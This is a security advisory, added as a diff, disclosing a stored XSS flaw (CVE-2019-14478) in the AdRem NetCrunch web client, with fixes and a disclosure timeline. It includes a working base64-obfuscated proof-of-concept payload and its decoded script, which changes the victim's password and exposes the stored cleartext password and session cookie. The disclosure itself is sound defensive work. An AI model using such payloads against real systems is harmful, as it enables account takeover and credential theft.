@@ -1,0 +1,134 @@
+################################################################################
+#
+# COMPASS SECURITY ADVISORY
+# https://compass-security.com/en/research/advisories
+#
+################################################################################
+#
+# Product:  NetCrunch
+# Vendor:   AdRem
+# CSNC ID:  CSNC-2019-013
+# CVE ID:   CVE-2019-14478
+# Subject:  Cross-Site Scripting (XSS)
+# Risk:     High
+# Effect:   Remotely exploitable
+# Authors:  Thierry Viaccoz <thierry.viaccoz@compass-security.com>
+#           Sylvain Heiniger <sylvain.heiniger@compass-security.com>
+#           Fabio Poloni <fabio.poloni@compass-security.com>
+# Date:     26.07.2019
+#
+################################################################################
+
+Introduction:
+-------------
+NetCrunch [1] is a so-called "agentless" monitoring solution developed by 
+AdRem. It allows system administrators to monitor, visualize and get alerts 
+from many kinds of systems in their network. The solution consists of a server 
+and a fat client (also called console), as well as a web client.
+
+Due to its architecture, the monitoring server is a critical system as it 
+holds credentials, most of the time privileged, for all monitored system.
+
+During the advisory process, Compass Security identified a stored Cross-Site 
+Scripting (XSS) vulnerability in the AdRem NetCrunch web client. Successful 
+exploitation requires authentication and can be performed remotely.
+
+Affected:
+---------
+Initially vulnerable:
+ * AdRem NetCrunch 10.6.0.4587
+
+Not vulnerable:
+ * AdRem NetCrunch 11.0.0.5282 (old password required to change the password, 
+   "Remember me" function not present anymore and "HttpOnly" flag used)
+ * AdRem NetCrunch 11.0.3.5318
+
+No other version was tested, but it is believed that older versions are also 
+vulnerable.
+
+Technical Description:
+----------------------
+The user's input data is not properly encoded when being echoed back to the 
+user. Therefore, this data can be interpreted as executable code by the 
+browser and allows an attacker to execute JavaScript code in the context of 
+the user's browser if the victim opens or searches for a node whose "Display 
+Name" contains an XSS payload. Exploiting this vulnerability allows for 
+instance to:
+- Steal the password of the logged-in user if he used the "Remember me" 
+  function, since it stores the cleartext password of the user in the local 
+  storage.
+- Change the password of the logged-in user to an arbitrary value, since it is 
+  not required to enter the old password when changing it.
+- Steal the session cookie "WASessionId" of the logged-in user, since it 
+  doesn't have the "HttpOnly" flag set.
+
+Use the following proof-of-concept by opening a node and pasting the following 
+XSS payload in "Properties", "Display Name":
+    Malicious Node<img src=# onerror=eval(atob('dmFyIHhodHRwID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CnhodHRwLm9wZW4oIlBPU1QiLCAiL09wdGlvbnMuanNvbj9yZXF1ZXN0SWQ9NCIsIHRydWUpOwp4aHR0cC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIik7CnhodHRwLnNlbmQoIm5ld1Bhc3N3b3JkPWNvbXBhc3MmbmV3UGFzc3dvcmRDb25maXJtPWNvbXBhc3MiKTsKCnZhciBsb2dpbiA9IHdpbmRvdy5sb2NhbFN0b3JhZ2UuZ2V0SXRlbSgibG9naW4iKTsKdmFyIHBhc3N3b3JkID0gd2luZG93LmxvY2FsU3RvcmFnZS5nZXRJdGVtKCJwYXNzd29yZCIpOwoKaWYgKGxvZ2luICYmIHBhc3N3b3JkKSB7CiAgICBhbGVydCgnSGkgJyArIGxvZ2luICsgJywgc2luY2UgeW91IGNob3NlICJSZW1lbWJlciBtZSBvbiB0aGlzIGNvbXB1dGVyIiBhdCB0aGUgbG9naW4sIHlvdXIgcGFzc3dvcmQgIicgKyBwYXNzd29yZCArICciIGlzIHN0b3JlZCBvbiB0aGlzIGNvbXB1dGVyLiBJbiBhZGRpdGlvbiwgeW91ciBjb29raWVzIGFyZSAiJyArIGRvY3VtZW50LmNvb2tpZSArICciLiBGaW5hbGx5LCB5b3VyIHBhc3N3b3JkIGhhcyBqdXN0IGJlZW4gY2hhbmdlZCB0byAiY29tcGFzcyIuJyk7Cn0gZWxzZSB7CiAgICBhbGVydCgnSGksIHlvdXIgY29va2llcyBhcmUgIicgKyBkb2N1bWVudC5jb29raWUgKyAnIiBhbmQgeW91ciBwYXNzd29yZCBoYXMganVzdCBiZWVuIGNoYW5nZWQgdG8gImNvbXBhc3MiLicpOwp9'))>
+
+This stored XSS is triggered by using the search and typing the node's name 
+"Malicious Node" in the web client. It also gets triggered by opening the 
+"Node Settings" of this node.
+
+Once triggered, it executes the following JavaScript code:
+    <script>
+    var xhttp = new XMLHttpRequest();
+    xhttp.open("POST", "/Options.json?requestId=4", true);
+    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhttp.send("newPassword=compass&newPasswordConfirm=compass");
+    
+    var login = window.localStorage.getItem("login");
+    var password = window.localStorage.getItem("password");
+    
+    if (login && password) {
+        alert('Hi ' + login + ', since you chose "Remember me on this computer" at the login, your password "' + password + '" is stored on this computer. In addition, your cookies are "' + document.cookie + '". Finally, your password has just been changed to "compass".');
+    } else {
+        alert('Hi, your cookies are "' + document.cookie + '" and your password has just been changed to "compass".');
+    }
+    </script>
+
+When opened by a user who used the "Remember me" function, the following popup is displayed:
+Hi username, since you chose "Remember me on this computer" at the login, your 
+password "username's password" is stored on this computer. In addition, your 
+cookies are "WASessionId=2125473284". Finally, your password has just been 
+changed to "compass".
+
+When opened by a user who didn't use the "Remember me" function the following popup is displayed:
+Hi, your cookies are "WASessionId=2125430785" and your password has just been 
+changed to "compass".
+
+During the advisory process, several XSS vulnerabilities were found. Each 
+time, a patch has been applied by NetCrunch.
+
+Workaround / Fix:
+-----------------
+Use a secure programming framework to encode dangerous characters in the 
+output according to the encoding rules of the respective type of context. For 
+regular HTML body content, use HTML encoding:
+- < -> &lt;
+- > -> &gt;
+- " -> &quot;
+- ' -> &apos;
+- & -> &amp;
+
+In addition, the user should have to provide the old password in order to 
+change it.
+
+Furthermore, the cleartext password of the user should not be stored on the 
+system by the "Remember me" function.
+
+Finally, the session cookie should have the "HttpOnly" flag set.
+
+As a NetCrunch customer, update your installation to the latest version to 
+receive the fix.
+
+Timeline:
+---------
+2019-05-23: Discovery by Thierry Viaccoz, Sylvain Heiniger and Fabio Poloni
+2019-08-01: Assigned CVE-2019-14478
+2019-08-29: Initial vendor notification
+2020-12-08: Coordinated public disclosure date
+
+References:
+-----------
+[1] https://www.adremsoft.com/
